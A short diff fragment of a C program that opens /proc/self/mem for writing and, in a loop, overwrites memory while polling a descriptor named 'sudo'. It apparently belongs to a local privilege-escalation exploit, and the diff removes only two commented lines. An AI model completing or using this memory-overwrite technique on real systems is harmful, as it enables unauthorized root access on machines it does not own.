@@ -33,8 +33,6 @@ int main(int argc, char **argv) {
 			int fd = open("/proc/self/mem", O_RDWR);
 			char buf[4] = "/lib";
 			for (int i = 0; !memcmp(buf, "/lib", 4); i++) {
-				//lseek(fd, (off_t)(unsigned int)pp, SEEK_SET);
-				//write(fd, us, strlen(us) + 1);
 				pwrite(fd, us, strlen(us) + 1, (off_t)(unsigned)pp);
 				if (!(i&0xff))
 					pread(sudo, buf, 4, pp-map);
